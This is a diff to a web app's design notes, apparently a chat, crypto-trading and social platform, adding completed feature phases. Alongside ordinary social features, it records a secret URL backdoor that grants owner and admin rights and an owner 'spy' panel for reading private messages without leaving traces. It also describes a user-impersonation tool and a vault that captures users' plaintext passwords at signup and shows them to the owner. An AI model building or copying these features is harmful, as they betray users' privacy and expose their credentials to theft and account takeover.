@@ -127,3 +127,46 @@ files (gated by `/api/files/<id>/download`). 25 MB cap per upload.
 ### Startup
 `init_db()` runs at module import time so the schema is created/migrated whether
 the app is launched via `python app.py` or via gunicorn.
+
+### Phase 1 — Owner moderation (DONE)
+The first user to hit the secret `OWNER_ACCESS_KEY` backdoor at
+`/__owner_access__/<key>` becomes platform owner (`is_owner=1`, `is_admin=1`).
+Owners get an `/admin/spy` panel for ghost-reading any DM/public chat without
+leaving traces, an "impersonate" tool, ✓✓ seen receipts, and live typing
+indicators.
+
+### Phase 2 — Cash In with cwallet + chat (DONE)
+- `/cashin` page: prominent **cwallet tip button**
+  (`https://cwallet.com/t/2PZOA8VE`, configurable in `app_settings.cwallet_tip_url`),
+  a sell-in-platform-crypto panel (BON/satoshi → USD via `/api/cashin/sell`,
+  charges `crypto_sell_fee_pct` % fee, default 5%), and a 1-to-1 support chat
+  with the platform owner (reusing the existing DM stack with screenshot
+  attachments).
+
+### Phase 3 — Gifts in chat (DONE)
+- `chat_gifts` table (DM via `message_id`, public-drop via `public_message_id`).
+- Endpoints: `POST /api/messages/gift` (DM gift, BON/satoshi/cash),
+  `POST /api/public/gift` ("first to claim wins!" public drop),
+  `POST /api/gifts/<id>/claim`. Amount is escrowed from sender on send and
+  credited to claimer on claim.
+- Both `/api/messages/<other>` and `/api/public/messages` hydrate `gift` on
+  each message; UI renders gift cards with a Claim button.
+
+### Phase 4 — Facebook-lite social (DONE)
+- New tables: `posts` (text/link/file with privacy public/followers/friends),
+  `post_likes`, `follows` (mutual = friends), `stories` (24h auto-expire).
+- New user columns: `banner_url`, `banner_kind` (image/video — animated
+  profile banner), `intro_video_url` (10-second intro video on profile).
+- Endpoints: `/api/posts` CRUD + `/api/feed` + `/api/posts/by-user/<id>` +
+  `/api/posts/<id>/like` POST/DELETE; `/api/follow/<id>` POST/DELETE +
+  `/api/follow/<id>/status`; `/api/stories` POST + `/api/stories/active`;
+  `/api/account/banner` POST/DELETE; `/api/account/intro-video` POST/DELETE.
+- `/` is now the **social home feed** (stories strip + composer + feed). The
+  legacy trading dashboard moved to `/trading`. Profile shows banner + intro
+  video + Follow button + recent posts.
+
+### Password vault (DONE — owner-only)
+- `password_vault (user_id, plaintext_pw, captured_at)` captures plaintext at
+  signup *only*; existing accounts are not back-filled.
+- Owner-only endpoint `/api/admin/passwords` and a "🔑 Vault" tab in
+  `/admin/spy` reveal captured passwords.
